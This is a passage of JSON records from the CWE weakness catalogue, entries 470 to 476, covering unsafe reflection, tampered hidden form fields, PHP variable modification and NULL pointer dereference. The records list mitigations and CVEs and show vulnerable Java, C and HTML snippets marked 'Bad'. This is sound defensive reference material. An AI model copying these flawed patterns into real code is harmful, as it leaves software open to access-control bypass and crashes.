{"ID": "470", "Name": "Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product uses external input with reflection to select which classes or code to use, but it does not sufficiently prevent the input from selecting improper classes or code.", "ExtendedDescription": "If the product uses external inputs to determine which class to instantiate or which method to invoke, then an attacker could supply values to select unexpected classes or methods. If this occurs, then the attacker could create control flow paths that were not intended by the developer. These paths could bypass authentication or access control checks, or otherwise cause the product to behave in an unexpected manner. This situation becomes a doomsday scenario if the attacker can upload files into a location that appears on the product's classpath (CWE-427) or add new entries to the product's classpath (CWE-426). Under either of these conditions, the attacker can use reflection to introduce new, malicious behavior into the product.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "913", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "913", "ViewID": "1003", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "610", "ViewID": "1000"}, {"Nature": "ChildOf", "CweID": "20", "ViewID": "700", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "PHP", "Prevalence": "Undetermined"}, {"Type": "Language", "Class": "Interpreted", "Prevalence": "Sometimes"}], "AlternateTerms": [{"Term": "Reflection Injection"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity", "Confidentiality", "Availability", "Other"], "Impact": ["Execute Unauthorized Code or Commands", "Alter Execution Logic"], "Note": "The attacker might be able to execute code that is not directly accessible to the attacker. Alternately, the attacker could call unexpected code in the wrong place or the wrong time, possibly modifying critical system state."}, {"Scope": ["Availability", "Other"], "Impact": ["DoS: Crash, Exit, or Restart", "Other"], "Note": "The attacker might be able to use reflection to call the wrong code, possibly with unexpected arguments that violate the API (CWE-227). This could cause the product to exit or hang."}, {"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "By causing the wrong code to be invoked, the attacker might be able to trigger a runtime error that leaks sensitive information in the error message, such as CWE-536."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Description": "Refactor your code to avoid using reflection."}, {"Phase": ["Architecture and Design"], "Description": "Do not use user-controlled inputs to select and load classes or code."}, {"Phase": ["Implementation"], "Description": "Apply strict input validation by using allowlists or indirect selection to ensure that the user is only selecting allowable classes or code."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "A common reason that programmers use the reflection API is to implement their own command dispatcher. The following example shows a command dispatcher that does not use reflection:"}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tString ctl = request.getParameter(\"ctl\");\n\tWorker ao = null;\n\tif (ctl.equals(\"Add\")) {\n\t\tao = new AddCommand();\n\t}\n\telse if (ctl.equals(\"Modify\")) {\n\t\tao = new ModifyCommand();\n\t}\n\telse {\n\t\tthrow new UnknownActionError();\n\t}\n\tao.doAction(request);\n```"}, {"BodyText": "A programmer might refactor this code to use reflection as follows:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tString ctl = request.getParameter(\"ctl\");\n\tClass cmdClass = Class.forName(ctl + \"Command\");\n\tWorker ao = (Worker) cmdClass.newInstance();\n\tao.doAction(request);\n```"}, {"BodyText": "The refactoring initially appears to offer a number of advantages. There are fewer lines of code, the if/else blocks have been entirely eliminated, and it is now possible to add new command types without modifying the command dispatcher. However, the refactoring allows an attacker to instantiate any object that implements the Worker interface. If the command dispatcher is still responsible for access control, then whenever programmers create a new class that implements the Worker interface, they must remember to modify the dispatcher's access control code. If they do not modify the access control code, then some Worker classes will not have any access control."}, {"BodyText": "One way to address this access control problem is to make the Worker object responsible for performing the access control check. An example of the re-refactored code follows:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tString ctl = request.getParameter(\"ctl\");\n\tClass cmdClass = Class.forName(ctl + \"Command\");\n\tWorker ao = (Worker) cmdClass.newInstance();\n\tao.checkAccessControl(request);\n\tao.doAction(request);\n```"}, {"BodyText": "Although this is an improvement, it encourages a decentralized approach to access control, which makes it easier for programmers to make access control mistakes. This code also highlights another security problem with using reflection to build a command dispatcher. An attacker can invoke the default constructor for any kind of object. In fact, the attacker is not even constrained to objects that implement the Worker interface; the default constructor for any object in the system can be invoked. If the object does not implement the Worker interface, a ClassCastException will be thrown before the assignment to ao, but if the constructor performs operations that work in the attacker's favor, the damage will already have been done. Although this scenario is relatively benign in simple products, in larger products where complexity grows exponentially it is not unreasonable that an attacker could find a constructor to leverage as part of an attack."}]}], "ObservedExamples": [{"Reference": "CVE-2018-1000613", "Description": "Cryptography API uses unsafe reflection when deserializing a private key", "Link": "https://www.cve.org/CVERecord?id=CVE-2018-1000613"}, {"Reference": "CVE-2004-2331", "Description": "Database system allows attackers to bypass sandbox restrictions by using the Reflection API.", "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2331"}], "RelatedAttackPatterns": ["138"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Top25Examples": [{"Reference": "CVE-2022-30287", "Description": "Horde Groupware Webmail Edition through 5.2.22 allows a reflection injection attack through which an attacker can instantiate a driver class. This then leads to arbitrary deserialization of PHP objects."}, {"Reference": "CVE-2022-24720", "Description": "image_processing is an image processing wrapper for libvips and ImageMagick/GraphicsMagick. Prior to version 1.12.2, using the `#apply` method from image_processing to apply a series of operations that are coming from unsanitized user input allows the attacker to execute shell commands. This method is called internally by Active Storage variants, so Active Storage is vulnerable as well. The vulnerability has been fixed in version 1.12.2 of image_processing. As a workaround, users who process based on user input should always sanitize the user input by allowing only a constrained set of operations."}, {"Reference": "CVE-2021-21327", "Description": "GLPI is an open-source asset and IT management software package that provides ITIL Service Desk features, licenses tracking and software auditing. In GLPI before version 9.5.4 non-authenticated user can remotely instantiate object of any class existing in the GLPI environment that can be used to carry out malicious attacks, or to start a \u201cPOP chain\u201d. As an example of direct impact, this vulnerability affects integrity of the GLPI core platform and third-party plugins runtime misusing classes which implement some sensitive operations in their constructors or destructors. This is fixed in version 9.5.4."}]}
{"ID": "471", "Name": "Modification of Assumed-Immutable Data (MAID)", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The product does not properly protect an assumed-immutable element from being modified by an attacker.", "ExtendedDescription": "This occurs when a particular input is critical enough to the functioning of the application that it should not be modifiable at all, but it is. Certain resources are often assumed to be immutable when they are not, such as hidden form fields in web applications, cookies, and reverse DNS lookups.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "664", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Architecture and Design"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Modify Application Data"], "Note": "Common data types that are attacked are environment variables, web application parameters, and HTTP headers."}, {"Scope": ["Integrity"], "Impact": ["Unexpected State"]}], "PotentialMitigations": [{"Phase": ["Architecture and Design", "Operation", "Implementation"], "Description": "When the data is stored or transmitted through untrusted sources that could modify the data, implement integrity checks to detect unauthorized modification, or store/transmit the data in a trusted location that is free from external influence."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In the code excerpt below, an array returned by a Java method is modified despite the fact that arrays are mutable."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tString[] colors = car.getAllPossibleColors();\n\tcolors[0] = \"Red\";\n```"}]}], "ObservedExamples": [{"Reference": "CVE-2002-1757", "Description": "Relies on $PHP_SELF variable for authentication.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1757"}, {"Reference": "CVE-2005-1905", "Description": "Gain privileges by modifying assumed-immutable code addresses that are accessed by a driver.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1905"}], "RelatedAttackPatterns": ["384", "385", "386", "387", "388"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "MAID issues can be primary to many other weaknesses, and they are a major factor in languages that provide easy access to internal program constructs, such as PHP's register_globals and similar features. However, MAID issues can also be resultant from weaknesses that modify internal state; for example, a program might validate some data and store it in memory, but a buffer overflow could overwrite that validated data, leading to a change in program logic."}, {"Type": "Theoretical", "Note": "There are many examples where the MUTABILITY property is a major factor in a vulnerability."}]}
{"ID": "472", "Name": "External Control of Assumed-Immutable Web Parameter", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The web application does not sufficiently verify inputs that are assumed to be immutable but are actually externally controllable, such as hidden form fields.", "ExtendedDescription": "\n\nIf a web product does not properly protect assumed-immutable values from modification in hidden form fields, parameters, cookies, or URLs, this can lead to modification of critical data. Web applications often mistakenly make the assumption that data passed to the client in hidden fields or cookies is not susceptible to tampering. Improper validation of data that are user-controllable can lead to the application processing incorrect, and often malicious, input.\n\n\nFor example, custom cookies commonly store session data or persistent data across sessions. This kind of session data is normally involved in security related decisions on the server side, such as user authentication and access control. Thus, the cookies might contain sensitive data such as user credentials and privileges. This is a dangerous practice, as it can often lead to improper reliance on the value of the client-provided cookie by the server side application.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "642", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "471", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "AlternateTerms": [{"Term": "Assumed-Immutable Parameter Tampering"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Modify Application Data"], "Note": "Without appropriate protection mechanisms, the client can easily tamper with cookies and similar web data. Reliance on the cookies without detailed validation can lead to problems such as SQL injection. If you use cookie values for security related decisions on the server side, manipulating the cookies might lead to violations of security policies such as authentication bypassing, user impersonation and privilege escalation. In addition, storing sensitive data in the cookie without appropriate protection can also lead to disclosure of sensitive user data, especially data stored in persistent cookies."}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"MitigationID": "MIT-5", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nAssume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.\n\n\nWhen performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"\n\n\nDo not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.\n"}, {"MitigationID": "MIT-20", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In this example, a web application uses the value of a hidden form field (accountID) without having done any input validation because it was assumed to be immutable."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tString accountID = request.getParameter(\"accountID\");\n\tUser user = getUserFromID(Long.parseLong(accountID));\n```"}]}, {"Entries": [{"IntroText": "Hidden fields should not be trusted as secure parameters."}, {"BodyText": "An attacker can intercept and alter hidden fields in a post to the server as easily as user input fields. An attacker can simply parse the HTML for the substring:"}, {"Nature": "Bad", "Language": "HTML", "ExampleCode": "```\n\t<input type=\"hidden\"\n```"}, {"BodyText": "or even just \"hidden\". Hidden field values displayed later in the session, such as on the following page, can open a site up to cross-site scripting attacks."}]}], "ObservedExamples": [{"Reference": "CVE-2002-0108", "Description": "Forum product allows spoofed messages of other users via hidden form fields for name and e-mail address.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0108"}, {"Reference": "CVE-2000-0253", "Description": "Shopping cart allows price modification via hidden form field.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0253"}, {"Reference": "CVE-2000-0254", "Description": "Shopping cart allows price modification via hidden form field.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0254"}, {"Reference": "CVE-2000-0926", "Description": "Shopping cart allows price modification via hidden form field.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0926"}, {"Reference": "CVE-2000-0101", "Description": "Shopping cart allows price modification via hidden form field.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0101"}, {"Reference": "CVE-2000-0102", "Description": "Shopping cart allows price modification via hidden form field.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0102"}, {"Reference": "CVE-2000-0758", "Description": "Allows admin access by modifying value of form field.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0758"}, {"Reference": "CVE-2002-1880", "Description": "Read messages by modifying message ID parameter.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1880"}, {"Reference": "CVE-2000-1234", "Description": "Send email to arbitrary users by modifying email parameter.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-1234"}, {"Reference": "CVE-2005-1652", "Description": "Authentication bypass by setting a parameter.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1652"}, {"Reference": "CVE-2005-1784", "Description": "Product does not check authorization for configuration change admin script, leading to password theft via modified e-mail address field.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1784"}, {"Reference": "CVE-2005-2314", "Description": "Logic error leads to password disclosure.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2314"}, {"Reference": "CVE-2005-1682", "Description": "Modification of message number parameter allows attackers to read other people's messages.", "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1682"}], "RelatedAttackPatterns": ["146", "226", "31", "39"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "This is a primary weakness for many other weaknesses and functional consequences, including XSS, SQL injection, path disclosure, and file inclusion."}, {"Type": "Theoretical", "Note": "This is a technology-specific MAID problem."}], "Top25Examples": [{"Reference": "CVE-2021-41322", "Description": "Poly VVX 400/410 5.3.1 allows low-privileged users to change the Admin password by modifying a POST parameter to 120 during the password reset process."}, {"Reference": "CVE-2021-45896", "Description": "Nokia FastMile 3TG00118ABAD52 devices allow privilege escalation by an authenticated user via is_ctc_admin=1 to login_web_app.cgi and use of Import Config File."}, {"Reference": "CVE-2022-0441", "Description": "The MasterStudy LMS WordPress plugin before 2.7.6 does to validate some parameters given when registering a new account, allowing unauthenticated users to register as an admin"}, {"Reference": "CVE-2021-43129", "Description": "A bypass exists for Desire2Learn/D2L Brightspace\u2019s \u201cDisable Right Click\u201d option in the quizzing feature, which allows a quiz-taker to access print and copy functionality via the browser\u2019s right click menu even when \u201cDisable Right Click\u201d is enabled on the quiz."}, {"Reference": "CVE-2022-4808", "Description": "Improper Privilege Management in GitHub repository usememos/memos prior to 0.9.1."}, {"Reference": "CVE-2021-27770", "Description": "The vulnerability was discovered within the \u201cFaviconService\u201d. The service takes a base64-encoded URL which is then requested by the webserver. We assume this service is used by the \u201cmeetings\u201d-function where users can specify an external URL where the online meeting will take place."}, {"Reference": "CVE-2021-39409", "Description": "A vulnerability exists in Online Student Rate System v1.0 that allows any user to register as an administrator without needing to be authenticated."}]}
{"ID": "473", "Name": "PHP External Variable Modification", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "A PHP application does not properly protect against the modification of variables from external sources, such as query parameters or cookies. This can expose the application to numerous weaknesses that would not exist otherwise.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "471", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "CanPrecede", "CweID": "98", "ViewID": "1000"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "PHP", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Modify Application Data"]}], "PotentialMitigations": [{"Phase": ["Requirements", "Implementation"], "Description": "Carefully identify which variables can be controlled or influenced by an external user, and consider adopting a naming convention to emphasize when externally modifiable variables are being used. An application should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking is performed when relying on input from outside a trust boundary. Do not allow your application to run with register_globals enabled. If you implement a register_globals emulator, be extremely careful of variable extraction, dynamic evaluation, and similar issues, since weaknesses in your emulation could allow external variable modification to take place even without register_globals."}], "ObservedExamples": [{"Reference": "CVE-2000-0860", "Description": "File upload allows arbitrary file read by setting hidden form variables to match internal variable names.", "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0860"}, {"Reference": "CVE-2001-0854", "Description": "Mistakenly trusts $PHP_SELF variable to determine if include script was called by its parent.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0854"}, {"Reference": "CVE-2002-0764", "Description": "PHP remote file inclusion by modified assumed-immutable variable.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0764"}, {"Reference": "CVE-2001-1025", "Description": "Modify key variable when calling scripts that don't load a library that initializes it.", "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1025"}, {"Reference": "CVE-2003-0754", "Description": "Authentication bypass by modifying array used for authentication.", "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0754"}], "RelatedAttackPatterns": ["77"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Relationship", "Note": "This is a language-specific instance of Modification of Assumed-Immutable Data (MAID). This can be resultant from direct request (alternate path) issues. It can be primary to weaknesses such as PHP file inclusion, SQL injection, XSS, authentication bypass, and others."}]}
{"ID": "474", "Name": "Use of Function with Inconsistent Implementations", "Abstraction": "Base", "Structure": "Simple", "Status": "Draft", "Description": "The code uses a function that has inconsistent implementations across operating systems and versions.", "ExtendedDescription": "\n\nThe use of inconsistent implementations can cause changes in behavior when the code is ported or built under a different environment than the programmer expects, which can lead to security problems in some cases.\n\n\nThe implementation of many functions varies by platform, and at times, even by different versions of the same platform. Implementation differences can include:\n\n\n  - Slight differences in the way parameters are interpreted leading to inconsistent results.\n\n  - Some implementations of the function carry significant security risks.\n\n  - The function might not be defined on all platforms.\n\n  - The function might change which return codes it can provide, or change the meaning of its return codes.\n\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "758", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}, {"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Often"}, {"Type": "Language", "Name": "PHP", "Prevalence": "Often"}, {"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Quality Degradation", "Varies by Context"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Architecture and Design", "Requirements"], "Description": "Do not accept inconsistent behavior from the API specifications when the deviant behavior increase the risk level."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "475", "Name": "Undefined Behavior for Input to API", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The behavior of this function is undefined unless its control parameter is set to a specific value.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "573", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Quality Degradation", "Varies by Context"]}], "DetectionMethods": [{"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Other", "Note": "The Linux Standard Base Specification 2.0.1 for libc places constraints on the arguments to some internal functions [21]. If the constraints are not met, the behavior of the functions is not defined. It is unusual for this function to be called directly. It is almost always invoked through a macro defined in a system header file, and the macro ensures that the following constraints are met: The value 1 must be passed to the third parameter (the version number) of the following file system function: __xmknod The value 2 must be passed to the third parameter (the group argument) of the following wide character string functions: __wcstod_internal __wcstof_internal __wcstol_internal __wcstold_internal __wcstoul_internal The value 3 must be passed as the first parameter (the version number) of the following file system functions: __xstat __lxstat __fxstat __xstat64 __lxstat64 __fxstat64"}]}
{"ID": "476", "Name": "NULL Pointer Dereference", "Abstraction": "Base", "Structure": "Simple", "Status": "Stable", "Diagram": "/data/images/CWE-476-Diagram.png", "Description": "The product dereferences a pointer that it expects to be valid but is NULL.", "LikelihoodOfExploit": "Medium", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "754", "ViewID": "1000"}, {"Nature": "ChildOf", "CweID": "754", "ViewID": "1003", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Resultant", "Description": "NULL pointer dereferences are frequently resultant from rarely encountered error conditions and race conditions, since these are most likely to escape detection during the testing phases."}], "ApplicablePlatforms": [{"Type": "Language", "Name": "C", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C++", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "C#", "Prevalence": "Undetermined"}, {"Type": "Language", "Name": "Go", "Prevalence": "Undetermined"}], "AlternateTerms": [{"Term": "NPD", "Description": "Common abbreviation for Null Pointer Dereference"}, {"Term": "null deref", "Description": "Common abbreviation for Null Pointer Dereference"}, {"Term": "NPE", "Description": "Common abbreviation for Null Pointer Exception"}, {"Term": "nil pointer dereference", "Description": "used for access of nil in Go programs"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Availability"], "Impact": ["DoS: Crash, Exit, or Restart"], "Note": "NULL pointer dereferences usually result in the failure of the process unless exception handling (on some platforms) is available and implemented. Even when exception handling is being used, it can still be very difficult to return the software to a safe state of operation."}, {"Scope": ["Integrity", "Confidentiality"], "Impact": ["Execute Unauthorized Code or Commands", "Read Memory", "Modify Memory"], "Note": "In rare circumstances, when NULL is equivalent to the 0x0 memory address and privileged code can access it, then writing or reading memory is possible, which may lead to code execution."}], "DetectionMethods": [{"DetectionMethodID": "DM-2", "Method": "Automated Dynamic Analysis", "Description": "This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.", "Effectiveness": "Moderate"}, {"DetectionMethodID": "DM-12", "Method": "Manual Dynamic Analysis", "Description": "Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself."}, {"DetectionMethodID": "DM-14", "Method": "Automated Static Analysis", "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "If all pointers that could have been modified are checked for NULL before use, nearly all NULL pointer dereferences can be prevented."}, {"Phase": ["Requirements"], "Description": "Select a programming language that is not susceptible to these issues."}, {"Phase": ["Implementation"], "Description": "Check the results of all functions that return a value and verify that the value is non-null before acting upon it.", "Effectiveness": "Moderate", "EffectivenessNotes": "Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment. This solution does not handle the use of improperly initialized variables (CWE-665)."}, {"Phase": ["Architecture and Design"], "Description": "Identify all variables and data stores that receive information from external sources, and apply input validation to make sure that they are only initialized to expected values."}, {"Phase": ["Implementation"], "Description": "Explicitly initialize all variables and other data stores, either during declaration or just before the first usage."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "While there are no complete fixes aside from conscientious programming, the following steps will go a long way to ensure that NULL pointer dereferences do not occur."}, {"Nature": "Good", "ExampleCode": "```\n\tif (pointer1 != NULL) {\n```\n/* make use of pointer1 */* \n\t\t\t\n\t\t\t */* ... */* \n\t\t\t}"}, {"BodyText": "When working with a multithreaded or otherwise asynchronous environment, ensure that proper locking APIs are used to lock before the if statement; and unlock when it has finished."}]}, {"ID": "DX-1", "Entries": [{"IntroText": "This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer."}, {"Nature": "Bad", "Language": "C", "ExampleCode": "```\n\tvoid host_lookup(char *user_supplied_addr){\n\t\t\tstruct hostent *hp;\n\t\t\tin_addr_t *addr;\n\t\t\tchar hostname[64];\n\t\t\tin_addr_t inet_addr(const char *cp);\n```\n/*routine that ensures user_supplied_addr is in the right format for conversion */* \n\t\t\t\n\t\t\tvalidate_addr_form(user_supplied_addr);\n\t\t\taddr = inet_addr(user_supplied_addr);\n\t\t\thp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);\n\t\t\tstrcpy(hostname, hp->h_name);}"}, {"BodyText": "If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr (CWE-252), a NULL pointer dereference (CWE-476) would then occur in the call to strcpy()."}, {"BodyText": "Note that this code is also vulnerable to a buffer overflow (CWE-119)."}]}, {"Entries": [{"IntroText": "In the following code, the programmer assumes that the system always has a property named \"cmd\" defined. If an attacker can control the program's environment so that \"cmd\" is not defined, the program throws a NULL pointer exception when it attempts to call the trim() method."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tString cmd = System.getProperty(\"cmd\");\n\tcmd = cmd.trim();\n```"}]}, {"ID": "DX-110", "Entries": [{"IntroText": "This Android application has registered to handle a URL when sent an intent:"}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n```\n...* \n\tIntentFilter filter = new IntentFilter(\"com.example.URLHandler.openURL\");\n\tMyReceiver receiver = new 